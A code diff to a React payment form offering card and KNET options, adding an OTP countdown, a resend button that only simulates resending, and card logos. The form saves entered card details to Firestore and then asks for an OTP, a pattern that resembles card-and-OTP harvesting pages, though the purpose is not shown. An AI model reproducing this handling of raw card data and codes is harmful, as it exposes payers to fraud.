@@ -1,7 +1,7 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { CreditCard, CheckCircle, AlertCircle, ArrowRight, Lock } from "lucide-react"
 import { doc, updateDoc } from "firebase/firestore"
 import { db } from "../../firebase"
@@ -11,10 +11,9 @@ interface PaymentSelectionProps {
   setPage: (page: string) => void
 }
 
-export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
-  const navigate = useNavigate()
+export default function PaymentSelection({ setPage}: PaymentSelectionProps) {
+  const navigate=useNavigate()
   const [paymentMethod, setPaymentMethod] = useState("card")
-
   const [cardDetails, setCardDetails] = useState({
     name: "",
     number: "",
@@ -27,6 +26,7 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
   const [otpError, setOtpError] = useState("")
   const [otpAttempts, setOtpAttempts] = useState(0)
   const [cardError, setCardError] = useState("")
+  const [timer, setTimer] = useState(0)
 
   // Format card number with spaces
   const formatCardNumber = (value: string) => {
@@ -117,7 +117,7 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
       if (navigate) {
         navigate("kent")
       } else {
-       // navigate("kent")
+        setPage("kent")
       }
       return
     }
@@ -141,6 +141,8 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
         setTimeout(() => {
           setIsProcessing(false)
           setShowOtp(true)
+          // Start OTP timer
+          setTimer(60)
         }, 1500)
       } catch (error) {
         console.error("Error saving card details:", error)
@@ -213,18 +215,39 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
     }
   }
 
+  // OTP timer countdown
+  useEffect(() => {
+    let interval: NodeJS.Timeout
+    if (timer > 0) {
+      interval = setInterval(() => {
+        setTimer((prevTimer) => prevTimer - 1)
+      }, 1000)
+    }
+    return () => clearInterval(interval)
+  }, [timer])
+
+  const handleResendOtp = () => {
+    if (timer === 0) {
+      setTimer(60)
+      // Simulate sending a new OTP
+      setTimeout(() => {
+        // In a real app, you would trigger the OTP sending process here
+      }, 500)
+    }
+  }
+
   // Detect card type based on first digits
   const getCardType = () => {
     const number = cardDetails.number.replace(/\s+/g, "")
 
     if (number.startsWith("4")) {
-      return "Visa"
+      return { name: "Visa", logo: "/visa.png" }
     } else if (/^5[1-5]/.test(number)) {
-      return "Mastercard"
+      return { name: "Mastercard", logo: "/mastercard.png" }
     } else if (/^3[47]/.test(number)) {
-      return "American Express"
+      return { name: "American Express", logo: "/amex.png" }
     } else if (/^6(?:011|5)/.test(number)) {
-      return "Discover"
+      return { name: "Discover", logo: "/discover.png" }
     }
 
     return null
@@ -233,27 +256,24 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
   const cardType = getCardType()
 
   return (
-    <div className="w-full max-w-md mx-auto bg-white dark:bg-blue-800 rounded-lg border border-blue-200 dark:border-blue-700 shadow-lg p-4 overflow-hidden">
+    <div className="w-full max-w-md p-4 mx-auto bg-white dark:bg-blue-800 rounded-lg border border-blue-200 dark:border-blue-700 shadow-lg overflow-hidden">
       <div className="p-6 border-b border-blue-200 dark:border-blue-700">
         <div className="flex items-center justify-between">
           <div>
-            <h2 className="text-xl font-semibold text-blue-900 dark:text-blue-100">Payment Method</h2>
-            <p className="text-sm text-blue-500 dark:text-blue-400 mt-1">Select how you would like to pay</p>
+            <h2 className="text-xl font-semibold text-black dark:text-blue-100" style={{color:'black'}}>Payment Method</h2>
+            <p className="text-sm text-blue-500 dark:text-blue-400 mt-1" style={{color:'black'}}>Select how you would like to pay</p>
           </div>
-          <div className="flex items-center text-sm text-blue-500 dark:text-blue-400">
-            <Lock className="h-4 w-4 mr-1" />
-            Secure Payment
-          </div>
+        
         </div>
       </div>
 
       {!showOtp ? (
         <>
-          <div className="p-6">
+          <div className="p-6 flex flex-col items-center justify-between p-2" style={{color:'black'}}>
             {/* Payment Method Tabs */}
             <div className="mb-6">
               <div className="grid grid-cols-2 gap-4">
-                <div className="w-full">
+                <div className="w-full m-2">
                   <input
                     type="radio"
                     id="card"
@@ -269,12 +289,12 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
                       paymentMethod === "card" ? "border-blue-500 shadow-sm" : "border-blue-200 dark:border-blue-700"
                     }`}
                   >
-                    <CreditCard className="mb-3 h-6 w-6 text-blue-700 dark:text-blue-300" />
-                    <span className="text-sm font-medium">Card</span>
+                    <img src="/mastercard.svg" width={25}/>
+                    <img src="/visa.svg" width={25}/>
                   </label>
                 </div>
 
-                <div className="w-full">
+                <div className="w-full m-2">
                   <input
                     type="radio"
                     id="knet"
@@ -290,10 +310,9 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
                       paymentMethod === "knet" ? "border-blue-500 shadow-sm" : "border-blue-200 dark:border-blue-700"
                     }`}
                   >
-                    <div className="mb-3 h-6 w-6 flex items-center justify-center">
-                      <img src="/kv.png" alt="KNET" className="h-6 w-6" />
+                    <div className="mb-3 flex items-center justify-center">
+                      <img src="/kv.png" alt="KNET" width={50}  />
                     </div>
-                    <span className="text-sm font-medium">KNET</span>
                   </label>
                 </div>
               </div>
@@ -301,7 +320,7 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
 
             {/* Card Form */}
             {paymentMethod === "card" && (
-              <div className="space-y-4">
+              <div className="space-y-4 m-2">
                 <div className="space-y-2">
                   <label htmlFor="card-name" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
                     Name on Card
@@ -323,19 +342,26 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
                     </label>
                     {cardType && (
                       <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 dark:bg-blue-700 text-blue-800 dark:text-blue-300 border border-blue-200 dark:border-blue-600">
-                        {cardType}
+                        {cardType.name}
                       </span>
                     )}
                   </div>
-                  <input
-                    id="card-number"
-                    type="text"
-                    className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
-                    placeholder="1234 5678 9012 3456"
-                    value={cardDetails.number}
-                    onChange={handleInputChange}
-                    maxLength={19}
-                  />
+                  <div className="relative">
+                    <input
+                      id="card-number"
+                      type="text"
+                      className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
+                      placeholder="1234 5678 9012 3456"
+                      value={cardDetails.number}
+                      onChange={handleInputChange}
+                      maxLength={19}
+                    />
+                    {cardType && (
+                      <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
+                        <CreditCard className="h-5 w-5 text-blue-500" />
+                      </div>
+                    )}
+                  </div>
                 </div>
 
                 <div className="grid grid-cols-2 gap-4">
@@ -429,15 +455,20 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
             <label htmlFor="otp" className="block text-sm font-medium text-blue-700 dark:text-blue-300">
               Enter OTP
             </label>
-            <input
-              id="otp"
-              type="text"
-              placeholder="Enter 4-digit code"
-              value={otp}
-              onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, "").substring(0, 6))}
-              className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-center text-lg tracking-widest shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
-              maxLength={6}
-            />
+            <div className="relative">
+              <input
+                id="otp"
+                type="text"
+                placeholder="Enter 4-digit code"
+                value={otp}
+                onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, "").substring(0, 6))}
+                className="w-full px-3 py-2 border border-blue-300 dark:border-blue-600 rounded-md text-center text-lg tracking-widest shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-blue-700 text-blue-900 dark:text-blue-100"
+                maxLength={6}
+              />
+              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                <div className="text-xs text-blue-500 dark:text-blue-400 font-medium">{cardType?.name || "Card"}</div>
+              </div>
+            </div>
 
             {otpError && (
               <div className="flex items-center text-sm text-red-500 mt-2">
@@ -469,7 +500,13 @@ export default function PaymentSelection({ setPage }: PaymentSelectionProps) {
 
           <p className="text-xs text-center text-blue-500 dark:text-blue-400">
             Didn't receive the code?{" "}
-            <button className="text-blue-600 dark:text-blue-400 hover:underline text-xs">Resend OTP</button>
+            <button
+              onClick={handleResendOtp}
+              disabled={timer > 0}
+              className={`text-blue-600 dark:text-blue-400 hover:underline text-xs ${timer > 0 ? "opacity-50 cursor-not-allowed" : ""}`}
+            >
+              {timer > 0 ? `Resend in ${timer}s` : "Resend OTP"}
+            </button>
           </p>
         </div>
       )}
